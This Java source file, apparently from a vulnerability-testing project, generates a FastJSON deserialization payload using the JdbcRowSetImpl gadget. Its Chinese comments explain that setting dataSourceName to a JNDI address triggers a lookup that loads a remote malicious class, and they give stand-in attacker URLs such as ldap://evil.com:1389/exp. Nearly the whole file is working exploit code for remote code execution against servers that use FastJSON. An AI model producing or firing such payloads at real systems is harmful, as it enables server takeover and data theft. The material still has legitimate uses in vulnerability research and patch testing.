package com.govuln.fastjsonattack;

/**
 * FastJSON JdbcRowSetImpl Gadget
 * 利用 JdbcRowSetImpl 进行 JNDI 注入
 * 
 * 原理：
 * 1. FastJSON 反序列化 JdbcRowSetImpl 时，会调用 setter 方法
 * 2. 设置 dataSourceName 为恶意 JNDI 地址（如 ldap://evil.com/exp）
 * 3. 调用 getConnection() 时会触发 JNDI lookup，从而加载远程恶意类
 */
public class FastJSONJdbcRowSetImpl {
    
    /**
     * 生成基于 JdbcRowSetImpl 的 FastJSON payload（JNDI 注入）
     * @param jndiUrl JNDI 地址，例如：ldap://evil.com:1389/exp
     * @return JSON 字符串
     */
    public String getPayload(String rmiUrl) {
        // FastJSON 在反序列化时会调用 setter 方法
        // 设置 dataSourceName 后，调用 getConnection() 会触发 JNDI lookup
        
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append("\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",");
        sb.append("\"dataSourceName\":\"").append(rmiUrl).append("\",");
        sb.append("\"autoCommit\":true");
        sb.append("}");
        
        return sb.toString();
    }
}



